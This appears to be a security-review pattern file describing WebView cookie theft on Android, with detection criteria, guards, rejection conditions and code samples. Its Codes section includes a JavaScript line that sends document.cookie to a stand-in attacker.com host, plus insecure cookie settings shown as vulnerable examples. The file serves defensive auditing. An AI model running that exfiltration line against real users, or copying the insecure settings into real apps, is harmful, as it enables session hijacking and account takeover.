# Pattern: WebView Cookie Theft

## Match

`CookieManager` or WebView persistence lets an attacker-influenced request reach a same-origin endpoint carrying the user's cookies. Key primitives:
1. **CookieManager shared between WebView and `HttpURLConnection`/`OkHttp`** — non-obvious. A cookie set by the WebView on the app's API domain can be read by the network client. Attacker script on same domain fetches `/api/me`.
2. `setAcceptThirdPartyCookies(true)` — third-party script sets cookies surviving the WebView session.
3. `removeAllCookies(null)` never called after sensitive nav — cookies persist across runs.
4. WebView reachable to attacker host carrying same-domain cookies; `javascript:` URL exfiltrates `document.cookie`.

## Analyze

- entry: `CookieManager.setAcceptCookie`, `setAcceptThirdPartyCookies`, `CookieSyncManager.createInstance` (deprecated), `setCookie(url, value)`, WebView reaching an attacker host, `javascript:` URL in WebView, redirect to a non-HTTPS host
- control: host, scheme, cookie `Domain` / `Path` / `Secure` / `HttpOnly` / `SameSite`, WebView vs. network client sharing, `CookieManager.removeAllCookies` timing
- sink: `CookieManager.getCookie(url)` returning the user's session cookie, `HttpURLConnection` reading the shared `CookieManager` for the same domain, exfiltration to `http://attacker.com`, replay of stolen session cookie
- guard: `setAcceptThirdPartyCookies(false)`, never load `javascript:` URL, use only `https://` for cookie-bearing domains, prefer `OkHttp` with own `CookieJar` over shared WebView `CookieManager`, `setBlockNetworkLoads(true)` for non-network WebViews, clear cookies on logout
- impact: session cookie theft via shared CookieManager, account takeover, cross-app cookie theft

## Reject

Reject when the network client uses its own `CookieJar` (not shared WebView `CookieManager`), the WebView loads only trusted origin, and no `javascript:` URL is loaded.

## Codes

```java
// WebView loads an attacker host
webView.loadUrl("http://attacker.com/exploit.html");
```

```javascript
// javascript: URL exfiltrates cookies from a vulnerable page
document.location = "http://attacker.com/?c=" + document.cookie;
```

```java
// accept third-party cookies — third-party script can set/override the session cookie
CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
```

```java
// session cookie missing Secure + HttpOnly
String cookie = "session=" + sessionToken + "; path=/; domain=victim.com";
CookieManager.getInstance().setCookie("http://victim.com", cookie);
```

```java
// WebView and network client share the same CookieManager
okHttpClient.cookieJar(new WebViewCookieJar(webView));
```
